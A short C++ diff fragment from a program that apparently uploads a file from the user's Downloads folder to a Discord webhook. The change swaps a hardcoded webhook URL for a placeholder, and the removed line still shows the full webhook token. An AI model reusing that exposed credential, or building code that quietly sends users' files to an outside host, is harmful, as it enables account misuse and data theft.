@@ -127,7 +127,7 @@ void sendToWebhook(const std::string& filepath, const std::string& webhookUrl) {
 int main() {
     std::string downloads = getDownloadsPath();
 
-    std::string webhook = "https://discord.com/api/webhooks/1374041380439199745/ZIWLcvoeNFRFUdmlAuMzIi6gQ4XXy12jv528E7TBKpvolPeYTnIo4otO-9lIDruHSz-4";
+    std::string webhook = "YOUR_WEBHOOK";
 
     std::string filename = downloads + (
         downloads.back() == '/' || downloads.back() == '\\' ? "" :
